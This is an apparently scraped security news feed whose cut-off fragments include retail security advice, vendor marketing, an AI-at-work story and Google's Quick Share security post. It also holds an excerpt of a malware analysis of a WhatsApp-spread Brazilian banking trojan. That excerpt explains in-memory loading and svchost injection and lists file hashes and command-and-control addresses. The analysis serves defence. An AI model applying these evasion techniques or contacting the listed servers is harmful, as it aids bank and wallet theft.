<strong>32%</strong> of retailers are making a significant investment in ZTA, it is a critical investment that provides additional layers of protection against unpredictable threats such as ransomware and sophisticated attacks.</li>\n\t<li><strong>Invest in Resilience:</strong> Focus investments on <strong>Application security (66%)</strong> and <strong>Cyber-resilience processes across the business (65%)</strong> to get ahead of risks.</li>\n\t<li><strong>External Support:</strong> <strong>45%</strong> of retailers intend to work with threat intelligence providers in the next two years. Engage external specialists for training, incident response planning, and to help strengthen your defenses.</li>\n</ul>\n\n<h3>5. Safeguard Customer Data</h3>\n\n<p>The risk of a data breach is highest when transaction volume is high.</p>\n\n<ul>\n\t<li><strong>Limit Collection:</strong> Only collect the customer information you absolutely need for the transaction.</li>\n\t<li><strong>Encryption is Non-Negotiable:</strong> Use encryption to protect sensitive data both in transit and at rest. Ensure any stored customer information is securely encrypted and maintained in compliance with standards like <strong>PCI DSS</strong>.</li>\n\t<li><strong>Regular Data Backups:</strong> Have an automated, tested, and secure data backup plan. Store backups in a separate, secure location (like cloud storage) disconnected from your main network to ensure you can recover quickly from a ransomware or data-loss event.</li>\n</ul>\n\n<h3>6. Push Cyber Resilience Up the Organization</h3>\n\n<p>For security measures to be effective during a crisis like a DDoS attack or a breach, they must be supported from the top down.</p>\n\n<ul>\n\t<li><strong>Boardroom Engagement:</strong> Increase engagement among leadership so that cyber resilience is viewed as a <strong>core business function</strong>, not just an IT issue.</li>\n\t<li><strong>Accountability:</strong> 51% of executives say leadership roles are measured against cybersecurity performance indicators&mdash;this needs to be an organization-wide mandate to foster a resilient culture.</li>\n\t<li><strong>Alignment:</strong> Integrate security into business decisions from the beginning, including allocating a <strong>cybersecurity budget for new initiatives</strong> right from the start.</li>\n</ul>\n\n<p>The Black Friday 2025 shopping season will test the resilience of every retailer. By leveraging insights from the LevelBlue Futures Report and implementing these protective measures, you can move past overconfidence and transform your cybersecurity into a competitive advantage, ensuring a secure and profitable holiday.</p>",

      "link": "https://www.zscaler.com/blogs/zscaler-life/end-decision-fatigue-how-ai-helps-autumn-p-work-smarter",
      "summary": "At Zscaler, our \"AI Forward, People First\" philosophy is about what AI can unlock in our people. We believe an \"AI Innovator\" isn't just someone with AI in their title; it's anyone who embraces AI curiosity to transform how they work. We're building a culture to empower our teams to see AI not just as a tool, but as a professional partner. Meet Autumn Policicchio, a Partner Enablement Activation Manager, who shares her story of how her journey with AI began in the most unexpected way.It\u2019s ironic: I\u2019ve worked in the tech industry since before \"the cloud\" had two meanings, yet I was never someone who got excited about new technology. For years, I saw tech as just a tool for the job. But in the last year, something fundamental shifted. The AI I once imagined as science fiction became ubiquitous, and it started taking the guesswork out of my life.The \"Aha!\" Moment: Optimizing the Home LifeMy personal AI journey didn't start at my desk; it started in my kitchen. I wanted my family to eat better, and I wanted to spend less time on meal planning and managing our grocery budget.On a whim, I uploaded a list of groceries I keep on hand and details of a specific meal plan to a chat AI. Within minutes, it generated a full weekly plan, complete with recipes and shopping lists, perfectly optimized around my inventory. Before long, my family was eating better, and I was more efficient than ever.That personal \"aha!\" moment lit a fire in me. I was so impressed that I connected with Zscaler\u2019s internal AI experts to host an info session for the Women in Zscaler Engage (WIZE) employee resource group. It was a huge hit and inspired me to become an early adopter of ZChat, Zscaler\u2019s internal AI platform.AI as a Professional PartnerI decided to apply the same principle from my kitchen to my work: identify the biggest time sink and apply AI.As the manager for three simultaneous partner enablement programs, my bottleneck was clear: building presentations. I was constantly reinventing the wheel, and the creative drain from staring at blank slides was real.This is where AI became my professional partner and my creative assistant.A Cure for Writer\u2019s Block: Instead of staring at a blank slide, I use AI to brainstorm outlines, session flows, and talking points, kicking off the creative process instantly.A Creative Powerhouse: AI enables me to create stunning, relevant images and visual metaphors in seconds, adding a professional polish that used to take hours.The Honest Coach: This is the most critical part. I don\u2019t just ask for ideas; I upload my finished drafts and ask for actionable critiques. By providing detailed context and personas (e.g., \"Review this as a new partner who knows nothing about Zscaler\"), I get incredibly accurate feedback.I\u2019ve learned the magic is in the prompt. If I\u2019m not providing deep context\u2014often full paragraphs\u2014I'm not leveraging the full value of AI.Avoiding 'AI Workslop' with Strategic PromptingTo ensure my AI-enhanced work is truly impactful and adds substance, I employ a multi-layered approach:Strategic and Iterative Prompting: I break down complex tasks and focus on the 'why' behind the content. If an initial output feels generic, I vary my prompts to unearth deeper insights and ensure strategic alignment.Leveraging AI for Self-Critique (\"Coach the Intern\"): I prompt the AI to act as a senior manager coaching an intern, specifically identifying&nbsp;logical gaps, missing information, or assumptions.&nbsp;This forces the AI to move from generation to critical analysis, highlighting potential errors&nbsp;before they reach my audience.Persona-Based Feedback: I proactively ask the AI what an end-user (like a Zscaler partner) or a leader would question or expect. By anticipating these queries, I ensure the content is not just correct, but highly relevant, actionable, and persuasive.Full Circle: Investing in My \"Why\"Embracing AI has made me more efficient, but more importantly, it\u2019s helped me invest my time back into my \u201cwhy\u201d: to accelerate my growth, develop my strengths, and become the woman my 5-year-old self would be proud and excited about.This journey came full circle this past September when I had the honor of presenting a session at Zscaler\u2019s internal AI-First Summit on this very topic: using chat AI as your professional coach.Ultimately, by treating AI as a sophisticated thought partner\u2014and providing it with the deep context it needs\u2014I\u2019ve transformed generic information into persuasive, high-impact resources. AI didn't replace my job; it elevated it.Are you ready to grow, innovate, and find your own \"aha\" moment?

Instead of defending one\u2019s internal network from the outside world, organizations must shift to a model of digital risk that takes into account every possible point of compromise.&lt;/li&gt;\n      &lt;li&gt;Given the continuous influx of alerts and data facing organizations today, an essential aspect of effective enterprise cybersecurity today is an effective digital risk intelligence platform. And selecting the right one is of mission-critical importance to organizations\u2019 overall security posture.&lt;/li&gt;\n      &lt;li&gt;When selecting a digital risk management platform, organizations should prioritize the following five key capabilities:\n        &lt;ul&gt;\n          &lt;li&gt;Visibility&lt;/li&gt;\n          &lt;li&gt;Comprehensive brand and executive intelligence&lt;/li&gt;\n          &lt;li&gt;Third-party and supply chain oversight&lt;/li&gt;\n          &lt;li&gt;Credential monitoring&lt;/li&gt;\n          &lt;li&gt;Integration and contextualization&lt;/li&gt;\n        &lt;/ul&gt;\n      &lt;/li&gt;\n      &lt;li&gt;Recorded Future\u2019s Intelligence Cloud platform provides the kind of comprehensive, contextualized, and integrated view that organizations require to manage digital risk effectively in today\u2019s threat landscape.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;h2&gt;Your Biggest Security Blind Spot is Now the Entire Internet&lt;/h2&gt;\n    &lt;p&gt;The \u201csecurity perimeter\u201d is a long-standing and deeply-ingrained idea in enterprise cybersecurity. However, what was once defined as the boundary protecting your organization\u2019s internal network from the outside world is no longer a useful measure for understanding security posture. Today, the average organization\u2019s actual attack surface is sprawling, variable and amorphous, consisting of every social media profile, cloud bucket, line of code in a third-party app, employee credential, and more.&lt;/p&gt;\n    &lt;p&gt;Anywhere and everywhere your organization and its employees operate online represents a potential point of entry or compromise. And maintaining visibility into the various exposures, threats, and risks looming over that attack surface is incredibly difficult. Most security teams are drowning in disparate alerts coming from siloed systems, struggling to keep up with and make sense of them all.&lt;/p&gt;\n    &lt;p&gt;Ultimately, this results in a situation in which teams lack a complete, holistic view and understanding of their &lt;a href=\"https://www.recordedfuture.com/use-case/digital-risk\" rel=\"noreferrer\" target=\"_blank\"&gt;state of digital risk&lt;/a&gt;. Digital risk is defined as the potential for financial loss, disruption, or reputational damage resulting from the digital technologies, data breaches, cyberattacks, or failures in IT systems and digital processes. It encompasses any threat that arises from an organization\u2019s use of digital tools and platforms.&lt;/p&gt;\n    &lt;p&gt;With so much to safeguard, and so much information to sift through, organizations must find more effective ways to quickly and accurately separate signal from noise. Central to this effort is finding a digital risk management platform that is able to deliver timely, unified, contextualized, and actionable intelligence\u2014not just streams of data\u2014to your team.&lt;/p&gt;\n    &lt;p&gt;The following guide outlines the five mission-critical capabilities your digital risk management platform must have in order to keep pace with today\u2019s perimeterless threat landscape.&lt;/p&gt;\n    &lt;h2&gt;5 Key Capabilities Your Digital Risk Management Platform Can\u2019t Go Without&lt;/h2&gt;\n    &lt;p&gt;Evaluating a digital risk platform\u2019s true value comes down to the following five core functions. Lacking even one of these creates a critical capabilities gap and can compromise your organization\u2019s security posture in significant ways:&lt;/p&gt;\n    &lt;h3&gt;1. Visibility: A Complete, Bird\u2019s-Eye View of Your Attack Surface&lt;/h3&gt;\n    &lt;p&gt;One of the most effective strategies employed by attackers today is to target the assets you don\u2019t even know you own. After all, you can\u2019t effectively defend what you don\u2019t know exists. Things like shadow IT, exposed remote desktop protocols (RDP), and misconfigured cloud buckets are all excellent first entry points for an attacker to exploit.&lt;/p&gt;\n    &lt;p&gt;That\u2019s why, when considering digital risk management platforms, one of the most essential capabilities to look out for is the automated, continuous mapping of all these types of external assets (e.g., IPs, domains, certificates, cloud assets, code repositories). And for this kind of visibility to provide true value, this asset inventory must be enriched with vulnerability data and risk scores to not simply show you what\u2019s there, but what\u2019s exploitable and to what extent.&lt;/p&gt;\n    &lt;p&gt;To defend your attack surface effectively, you need to see your organization the way an adversary does\u2014with all of those blind spots illuminated, and the low-hanging fruit lit with high beams.&lt;/p&gt;\n    &lt;p&gt;This level of continuous, prioritized visibility allows teams to move beyond asset discovery and toward risk-based defense. Platforms with capabilities like Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/resources/guides/prevent-digital-risks-from-impacting-business\" rel=\"noreferrer\" target=\"_blank\"&gt;Attack Surface Intelligence&lt;/a&gt; deliver this comprehensive, continuous view, helping organizations identify and secure their most exposed points before they become entryways for attackers.&lt;/p&gt;\n    &lt;h3&gt;2. Comprehensive Intelligence: Real-Time Brand and Executive Protection&lt;/h3&gt;\n    &lt;p&gt;Brand impersonation, fraudulent social media accounts, and executive spoofing are among the fastest-growing forms of digital risk today. While the nature of these attacks differs significantly from more traditional breaches, that doesn\u2019t mean they don\u2019t come with serious consequences. Attacks like these can erode customer trust, hinder revenue, and even create regulatory exposure within minutes of going live.&lt;/p&gt;\n    &lt;p&gt;Therefore, an effective digital risk intelligence platform must provide continuous monitoring across the entire digital landscape\u2014not only for typosquatting domains (e.g., www.amazoon.com, facebok.com) but also on social media platforms, app stores, and the dark web. What\u2019s more, when a threat is detected, the platform should enable rapid remediation through integrated or automated takedown services. Because these types of attacks can damage trust and revenue within minutes, speed is critical when it comes to detection and remediation.&lt;/p&gt;\n    &lt;p&gt;Brand protection is no longer a marketing issue alone. This isn\u2019t simply about how your company is perceived by the public. It is a core security requirement. With serious implications for revenue, regulatory compliance, reputation, and more, it is mission critical that your digital risk intelligence platform enables comprehensive and responsive brand and executive protection capabilities.&lt;/p&gt;\n    &lt;p&gt;Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/blog/digital-risk-protection-overview\" rel=\"noreferrer\" target=\"_blank\"&gt;Brand Intelligence&lt;/a&gt;, for example, empowers teams to detect impersonation attempts in real time and act before harm spreads, keeping both the brand and its executives protected.&lt;/p&gt;\n    &lt;h3&gt;3. Securing Your Partnerships: Continuous Third-Party and Supply Chain Monitoring&lt;/h3&gt;\n    &lt;p&gt;Every vendor, supplier, and technology partner connected to your network expands your risk footprint. Today, as the average supply chain and number of third-party vendors expand exponentially, so do the associated risks. In fact, Verizon\u2019s 2025 DBIR reports &lt;a href=\"https://www.verizon.com/business/resources/T5ea/reports/2025-dbir-data-breach-investigations-report.pdf?cjdata=MXxOfDB8WXww&amp;amp;CMP=afc_m_p_cj_na_ot_2022_99&amp;amp;SID=78de3210-8e37-4234-93b5-4986f7430a7a&amp;amp;cjevent=01177a0bbf1911f081ea053a0a82b838&amp;amp;vendorid=CJM&amp;amp;PID=100357191&amp;amp;AID=11365093\" rel=\"noreferrer\" target=\"_blank\"&gt;third-party involvement in breaches doubled to 30% (from ~15% the year prior)&lt;/a&gt;.&lt;/p&gt;\n    &lt;p&gt;With over a quarter (26%) of today\u2019s organizations managing 250 or more third-party vendor relationships, monitoring third-party risk has become a daunting task. Remember, a breach in one of their environments can quickly become a problem of your own. Traditional vendor risk assessments and annual questionnaires simply can\u2019t keep up with today\u2019s enormous scale and rapid pace of change.&lt;/p&gt;\n    &lt;p&gt;This is why an effective digital risk intelligence platform must provide continuous visibility into the security posture of all third parties in one\u2019s ecosystem. This includes real-time monitoring for data leaks, mentions on dark web forums, and newly discovered vulnerabilities that could impact your organization through a shared dependency.&lt;/p&gt;\n    &lt;p&gt;With Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/blog/digital-risk-management\" rel=\"noreferrer\" target=\"_blank\"&gt;Third-Party Intelligence&lt;/a&gt; solution, organizations can proactively monitor their supply chains, receiving alerts the moment a vendor shows signs of compromise. This kind of ongoing visibility transforms vendor risk management from a reactive checkbox exercise into a continuous, intelligence-driven process.&lt;/p&gt;\n    &lt;h3&gt;4. No Stone Left Unturned: Dark Web and Leaked Credential Monitoring&lt;/h3&gt;\n    &lt;p&gt;One-in-five data breaches are now the result of compromised credentials, with the &lt;a href=\"https://blog.checkpoint.com/security/the-alarming-surge-in-compromised-credentials-in-2025/?utm_source=chatgpt.com\" rel=\"noreferrer\" target=\"_blank\"&gt;total volume of compromised credentials surging by over 160% thus far in 2025 alone&lt;/a&gt;. Leaked credentials are one of the most exploited gateways for cyberattacks today, fueling everything from phishing campaigns to ransomware. Detecting these exposures before they\u2019re used is essential for preventing account takeover and data loss.&lt;/p&gt;\n    &lt;p&gt;That\u2019s why real-time monitoring for leaked credentials is an essential capability for every modern digital risk intelligence platform. When selecting a platform, one must ensure it has persistent access to gated dark web forums, marketplaces, and paste sites where stolen data circulates. It must also be able to identify when employee or customer credentials appear for sale and correlate that data with active threat campaigns. Together, these capabilities form a backbone of defense that helps to &lt;a href=\"https://www.recordedfuture.com/resources/guides/prevent-digital-risks-from-impacting-business\" rel=\"noreferrer\" target=\"_blank\"&gt;prevent digital risk from impacting your business&lt;/a&gt;.&lt;/p&gt;\n    &lt;p&gt;Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/products/threat-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;Threat Intelligence&lt;/a&gt; capabilities excel in this area, offering deep visibility into dark web ecosystems and issuing automated alerts for compromised credentials or stolen data. By integrating this insight into daily operations, security teams can act swiftly to prevent compromise or other harm as a result of compromised credentials, shutting down risks before they evolve into active exploitation.&lt;/p&gt;\n    &lt;h3&gt;5. Integration and Contextualization: A Unified Intelligence Core That Provides Context&lt;/h3&gt;\n    &lt;p&gt;Without a unified intelligence framework, even the best tools can create more confusion than clarity. Siloed systems generate endless alerts but rarely explain how one threat connects to another. This often results in a morass of disjointed data that leaves teams overwhelmed and uncertain of what actions to take in order to mitigate their digital risk.&lt;/p&gt;\n    &lt;p&gt;It is only the most mature and advanced of digital risk management platforms that bring these disparate sources and signals together to create a single, coherent, and unified picture of an organization\u2019s overall state and provide the context necessary to inform action. Such systems operate from a single intelligence graph: one that correlates data from the open, deep, and dark web, as well as technical sources like malware sandboxes and exploit feeds. This unified approach allows security teams to see how individual risks fit into broader attack narratives and stay ahead of threats as they manifest across the digital ecosystem.&lt;/p&gt;\n    &lt;p&gt;For example, the platform should make it possible to connect a leaked credential to a threat actor exploiting a vulnerability in a vendor\u2019s system (effectively combining multiple key capabilities to create a single, streamlined picture of specific threats in context). Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/platform/intelligence-graph\" rel=\"noreferrer\" target=\"_blank\"&gt;Intelligence Graph\u24c7&lt;/a&gt; provides exactly that level of correlation, transforming raw data into actionable, prioritized intelligence that allows teams to make sense of the ever-evolving threat landscape and their organization\u2019s place within it.&lt;/p&gt;\n    &lt;p&gt;Together, these capabilities prove indispensable in the uphill battle that is &lt;a href=\"https://www.recordedfuture.com/blog/digital-risk-protection-overview\" rel=\"noreferrer\" target=\"_blank\"&gt;digital risk protection&lt;/a&gt;. Lacking just one can be enough to undermine one\u2019s efforts entirely.&lt;/p&gt;\n    &lt;h2&gt;The Universal Approach: Recorded Future\u2019s Intelligence Cloud&lt;/h2&gt;\n    &lt;p&gt;Modern digital risk management is a complex task that consists of a multitude of systems and signals. Running and managing separate tools for brand monitoring, attack surface management, supply chain risk, and more often creates more problems than it solves. Each system generates its own alerts and dashboards, forcing analysts to piece together the full picture manually.&lt;/p&gt;\n    &lt;p&gt;Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/platform\" rel=\"noreferrer\" target=\"_blank\"&gt;Intelligence Cloud&lt;/a&gt; eliminates that complexity. It unifies all five essential capabilities\u2014attack surface visibility, brand protection, third-party intelligence, threat intelligence, and vulnerability intelligence\u2014into one real-time, correlated platform. This comprehensive, integrated approach ensures every piece of data contributes to a larger understanding of risk. Instead of isolated alerts, users receive a complete threat narrative: what\u2019s happening, why it matters, and what to do next.&lt;/p&gt;\n    &lt;p&gt;Organizations that adopt this model not only strengthen their defenses but also gain the ability to prioritize resources effectively and demonstrate the ROI of intelligence-driven security.&lt;/p&gt;\n    &lt;h2&gt;Move From Reactive Defense to Proactive Intelligence&lt;/h2&gt;\n    &lt;p&gt;Most security teams are already overwhelmed by alerts. A digital risk intelligence platform shouldn\u2019t add more\u2014it should provide clarity. By consolidating external risk data into one unified view, organizations can make faster, better-informed decisions and shift from reactive defense to proactive intelligence.&lt;/p&gt;\n    &lt;p&gt;Investing in a single, unified platform, like Recorded Future\u2019s, that sees and connects everything reduces analyst fatigue, accelerates response, and empowers leaders to justify their security investments with confidence.&lt;/p&gt;\n    &lt;p&gt;Yesterday\u2019s perimeter-focused defense paradigm is over. Now, your organization must have visibility and control over every activity, portal, and point of entry online.

The loader then calls VirtualAlloc to reserve and commit a region of memory of size SizeOfImage with PAGE_READWRITE permissions.</p>\n<div><img alt=\"\" height=\"204\" src=\"https://labs.k7computing.com/wp-content/uploads/2025/11/Figure19.png\" width=\"690\" />Figure 19: Allocates memory</div>\n<p></p>\n<p>After copying sections, applying relocations, and resolving imports, the loader calls VirtualProtect on the allocated region to change protections to PAGE_EXECUTE_READWRITE. Then it reads the characteristics value in the image\u2019s header and checks if the PE file is a DLL or an EXE. If it is an EXE, it creates a new thread pointing to the entrypoint and if it is a DLL, it creates a DLL call address to the entrypoint (DLLMain).</p>\n<div><img alt=\"\" height=\"89\" src=\"https://labs.k7computing.com/wp-content/uploads/2025/11/Figure20.png\" width=\"690\" />Figure 20: Creates Thread or Calls DLLMain</div>\n<p></p>\n<p>The loaded PE then injects itself into <em>SVCHOST </em>and sends info to the attacker\u2019s server using IMAP over TCP connection once AutoIt finds active windows mentioned in Table 3 in a loop. This approach avoids writing&nbsp; the final payload into the disk, instead the real binary runs purely in memory.&nbsp;</p>\n<p>On inspecting the injected PE we found that it targets a set of&nbsp; Brazilian banks and crypto wallets.</p>\n<div><img alt=\"\" height=\"402\" src=\"https://labs.k7computing.com/wp-content/uploads/2025/11/Figure21.png\" width=\"690\" />Figure 21: Banking Trojan</div>\n<div><img alt=\"\" height=\"224\" src=\"https://labs.k7computing.com/wp-content/uploads/2025/11/Figure22.png\" width=\"644\" />Figure 22: Connects back to server</div>\n<p></p>\n<p>We\u2019re seeing many similar campaigns active across the cyber landscape. In this particular campaign, the malware spreads through WhatsApp. Because the malicious file is sent by someone already in our contacts, we tend not to verify its authenticity the same way we would if it came from an unknown sender. This trust in familiar contacts reduces our caution and increases the chances of the malware being opened and executed. So, we recommend using a reliable product like K7, which will protect you from these ongoing campaigns and safeguard both your information and resources from potential security threats</p>\n<h2>IOCs</h2>\n<table><tbody><tr><td><strong>File Name</strong></td><td><strong>Hash</strong></td><td><strong>Detection Name</strong></td></tr><tr><td>58e_577c10-3fd3751b-58e.vbs</td><td>F8DC59AF96E73F14FEFBC34840096153</td><td>Trojan ( 005d22581 )</td></tr><tr><td>Installer.msi</td><td>DB0EAB25B047F82A4644B3B86767A1AA</td><td>Trojan ( 0001140e1 )</td></tr><tr><td>mDjEvbze.log (AU3)</td><td>CE45C057113BA1CA6F1D7AE7E2004AFB</td><td>Trojan ( 0001140e1 )</td></tr><tr><td>NsmKL5.tda</td><td>5BCB9F187320893D1B1C36FA0C18E094</td><td>Trojan ( 0001140e1 )</td></tr><tr><td>95p1jx.dmp</td><td>8DBF440436EB57F38827351DDD05911A</td><td>Trojan ( 0001140e1 )</td></tr><tr><td>Installer.VBS</td><td>FB6A29742389AF2A0CB2AD114442D0FB</td><td>Trojan ( 005d22581 )</td></tr><tr><td>instalar.bat</td><td>6F1B82B320FEDA1F719C3028DA73E843</td><td>Trojan ( 0001140e1 )</td></tr><tr><td>whats.py</td><td>45027D8EA53921B59C70C38D90DD8C14</td><td>Trojan ( 0001140e1 )</td></tr></tbody></table>\n<h3>C2s</h3>\n<p><a href=\"https://varegjopeaks.com/altor/receptor.php\" rel=\"noopener\" target=\"_blank\">hxxps[:]//varegjopeaks.com/altor/receptor.php</a></p>\n<p>vip-imap-az.terra[.]com[.]br</p>\n<div><a href=\"https://www.facebook.com/sharer/sharer.php?u=https://labs.k7computing.com/index.php/brazilian-campaign-spreading-the-malware-via-whatsapp/\" rel=\"noopener\" target=\"_blank\">Facebook0</a><a href=\"https://twitter.com/intent/tweet?url=https://labs.k7computing.com/index.php/brazilian-campaign-spreading-the-malware-via-whatsapp/&amp;text=Brazilian Campaign: Spreading the Malware via WhatsApp\" rel=\"noopener\" target=\"_blank\">Twitter0</a><a href=\"https://www.linkedin.com/shareArticle?url=https://labs.k7computing.com/index.php/brazilian-campaign-spreading-the-malware-via-whatsapp/&amp;title=Brazilian Campaign: Spreading the Malware via WhatsApp&amp;summary=&amp;source=\" rel=\"noopener\" target=\"_blank\">Linkedin0</a><div><div>X</div></div></div>        \n        <p>The post <a href=\"https://labs.k7computing.com/index.php/brazilian-campaign-spreading-the-malware-via-whatsapp/\" rel=\"noopener\" target=\"_blank\">Brazilian Campaign: Spreading the Malware via WhatsApp</a> appeared first on <a href=\"https://labs.k7computing.com\" rel=\"noopener\" target=\"_blank\">K7 Labs</a>.</p>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://labs.k7computing.com/index.php/brazilian-campaign-spreading-the-malware-via-whatsapp/\">Brazilian Campaign: Spreading the Malware via WhatsApp - K7 Labs</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/brazilian-campaign-spreading-the-malware-via-whatsapp/101836\">Read full topic</a></p>",

      "summary": "IntroductionSaaS security posture management (SSPM) is essential for modern enterprises seeking to secure their expanding SaaS environments. With the proliferation of cloud applications, security leaders must move beyond reactive defense and adopt a continuous, resilient approach to SaaS risk. This guide explains how to architect SaaS security for&nbsp;resilience, leverage modern SSPM tools like Zscaler, and ensure your organization's cloud footprint stays protected and compliant.What is SaaS security posture management (SSPM)?SaaS security posture management (SSPM) refers to the set of practices, processes, and technologies used to continuously monitor, assess, and improve the security posture of SaaS applications. SSPM helps organizations identify misconfigurations, manage permissions, detect risky integrations, and maintain compliance with frameworks such as SOC 2, ISO 27001, and&nbsp;NIST.Why SaaS security demands a new approachThe modern enterprise runs on SaaS. Collaboration platforms, CRM systems, HR tools, and finance apps now live entirely in the cloud. But this convenience comes with complexity. Each SaaS app introduces&nbsp;unique configurations, permissions, and integration risks\u2014often managed by different teams.Misconfigured apps can expose sensitive dataOverprivileged and inactive accounts increase the&nbsp;attack surfaceRisky integrations (like OAuth-connected apps) introduce unknown vulnerabilitiesLack of visibility makes it hard to track user and data activityTraditional perimeter-based tools such as&nbsp;VPNs can\u2019t address these dynamic, identity-driven risks. What organizations need now is&nbsp;resilience\u2014a SaaS architecture that remains secure, even amid constant change.Pillars of a resilient SaaS security architectureA resilient SaaS security architecture is built on&nbsp;continuous awareness, adaptive control, and rapid recovery. It stands on six foundational pillars:Comprehensive SaaS visibility: Discover and inventory all SaaS applications, both sanctioned and unsanctioned. Map user roles, permissions, and third-party integrations to understand the full attack surface.Continuous configuration management: Monitor SaaS configurations in real time, benchmark settings against compliance standards, and detect configuration drift to prevent security gaps.Identity governance and&nbsp;least-privileged access:&nbsp;Enforce least-privileged access, monitor for excessive permissions, and eliminate orphaned or inactive accounts to reduce risk.Data protection and exposure control: Identify where sensitive data resides and control its exposure\u2014such as public sharing or risky third-party app access\u2014using integrated&nbsp;DLP and&nbsp;CASB solutions.Continuous monitoring and risk correlation: Correlate security posture data with identity and data context to surface and prioritize the most critical risks, enabling faster threat detection.Automated response and remediation: Leverage APIs and admin consoles to automate or guide remediation, reducing mean time to fix (MTTF) and ensuring ongoing compliance.Modern SSPM tools: Legacy vs. next-genSSPM began as a way to identify configuration issues. But the SaaS landscape has evolved\u2014and so have the tools protecting it.Modern SSPM platforms deliver&nbsp;continuous, contextual, and automated protection.

      "link": "http://security.googleblog.com/2025/11/android-quick-share-support-for-airdrop-security.html",
      "summary": "<span class=\"byline-author\">Posted by Dave Kleidermacher, VP, Platforms Security & Privacy, Google</span>\n\n<p>\nTechnology should bring people closer together, not create walls. Being able to communicate and connect with friends and family should be easy regardless of the phone they use. That\u2019s why Android has been building experiences that help you stay connected across platforms.\n</p>\n<p>\nAs part of our efforts to continue to make cross-platform communication more seamless for users, we've made Quick Share interoperable with AirDrop, allowing for two-way file sharing between Android and iOS devices, starting with the Pixel 10 Family. This new feature makes it possible to quickly share your photos, videos, and files with people you choose to communicate with, without worrying about the kind of phone they use. \n</p>\n<p>\nMost importantly, when you share personal files and content, you need to trust that it stays secure. You can share across devices with confidence knowing we built this feature with security at its core, protecting your data with strong safeguards that have been tested by independent security experts.\n</p>\n<h3>Secure by Design</h3>\n\n\n<p>\nWe built Quick Share\u2019s interoperability support for AirDrop with the same rigorous security standards that we apply to all Google products. Our approach to security is proactive and deeply integrated into every stage of the development process. This includes:\n</p>\n<ul>\n\n<li><strong>Threat Modeling:</strong> We identify and address potential security risks before they can become a problem.</li>\n\n<li><strong>Internal Security Design and Privacy Reviews:</strong> Our dedicated security and privacy teams thoroughly review the design to ensure it meets our high standards.</li>\n\n<li><strong>Internal Penetration Testing:</strong> We conduct extensive in-house testing to identify and fix vulnerabilities.</li>\n</ul>\n<p>\nThis <a href=\"https://blog.google/technology/safety-security/tackling-cybersecurity-vulnerabilities-through-secure-by-design/\">Secure by Design</a> philosophy ensures that all of our products are not just functional but also fundamentally secure.\n</p>\n<p>\nThis feature is also protected by a multi-layered security approach to ensure a safe sharing experience from end-to-end, regardless of what platform you\u2019re on. \n</p>\n<ul>\n\n<li><strong>Secure Sharing Channel:</strong> The communication channel itself is hardened by our use of Rust to develop this feature. This memory-safe language is the industry benchmark for building secure systems and provides confidence that the connection is protected against buffer overflow attacks and other common vulnerabilities. </li>\n\n<li><strong>Built-in Platform Protections: </strong>This feature is strengthened by the robust built-in security of both Android and iOS. On Android, security is built in at every layer. Our deep investment in Rust at the OS level hardens the foundation, while proactive defenses like <a href=\"https://support.google.com/googleplay/answer/2812853?hl=en\">Google Play Protect</a> work to keep your device safe. This is complemented by the security architecture of iOS that provides its own strong safeguards that mitigate malicious files and exploitation. These overlapping protections on both platforms work in concert with the secure connection to provide comprehensive safety for your data when you share or receive.</li>\n\n<li><strong>You\u2019re in Control: </strong>Sharing across platforms works just like you're used to: a file requires your approval before being received, so you're in control of what you accept.</li>\n</ul>\n<h3>The Power of Rust: A Foundation of Secure Communication</h3>\n\n\n<p>\nA key element of our security strategy for the interoperability layer between Quick Share and AirDrop is the use of the memory-safe Rust programming language. Recognized by security agencies around the world, including the <a href=\"https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/3608324/us-and-international-partners-issue-recommendations-to-secure-software-products/\">NSA</a> and <a href=\"https://media.defense.gov/2025/Jun/23/2003742198/-1/-1/0/CSI_MEMORY_SAFE_LANGUAGES_REDUCING_VULNERABILITIES_IN_MODERN_SOFTWARE_DEVELOPMENT.PDF\">CISA</a>, Rust is widely considered the industry benchmark for building secure systems because it eliminates entire classes of memory-safety vulnerabilities by design.\n</p>\n<p>\n<a href=\"https://security.googleblog.com/2024/09/eliminating-memory-safety-vulnerabilities-Android.html\">Rust is already a cornerstone</a> of our broader initiative to eliminate memory safety bugs across Android. Its selection for this feature was deliberate, driven by the unique security challenges of cross-platform communication that demanded the most robust protections for memory safety.\n</p>\n<p>\nThe core of this feature involves receiving and parsing data sent over a wireless protocol from another device. Historically, when using a memory-unsafe language, bugs in data parsing logic are one of the most common sources of high-severity security vulnerabilities. A malformed data packet sent to a parser written in a memory-unsafe language can lead to buffer overflows and other memory corruption bugs, creating an opportunity for code execution.\n</p>\n<p>\nThis is precisely where Rust provides a robust defense. Its compiler enforces strict ownership and borrowing rules at compile time, which guarantees memory safety. Rust removes entire classes of memory-related bugs. This means our implementation is inherently resilient against attackers attempting to use maliciously crafted data packets to exploit memory errors. \n</p>\n<h3>Secure Sharing Using AirDrop's \"Everyone\" Mode</h3>\n\n\n<p>\nTo ensure a seamless experience for both Android and iOS users, Quick Share currently works with AirDrop's \"Everyone for 10 minutes\" mode. This feature does not use a workaround; the connection is direct and peer-to-peer, meaning your data is never routed through a server, shared content is never logged, and no extra data is shared. As with \"Everyone for 10 minutes\" mode on any device when you\u2019re sharing between non-contacts, you can ensure you're sharing with the right person by confirming their device name on your screen with them in person.</p>\n<p>This implementation using \"Everyone for 10 minutes\u201d mode is just the first step in seamless cross-platform sharing, and we welcome the opportunity to work with Apple to enable \u201cContacts Only\u201d mode in the future.\n</p>\n<h3>Tested by Independent Security Experts</h3>\n\n\n<p>\nAfter conducting our own secure product development, internal threat modeling, privacy reviews, and red team penetration tests, we engaged with <strong><a href=\"https://www.netspi.com/\">NetSPI</a></strong>, a leading third-party penetration testing firm, to further validate the security of this feature and conduct an <a href=\"https://www.netspi.com/wp-content/uploads/2025/11/google-feature-review-report.pdf\">independent security assessment</a>. The assessment found the interoperability between Quick Share and AirDrop is secure, is \u201cnotably stronger\u201d than other industry implementations and does not leak any information. \n</p>\n<p>\nBased on 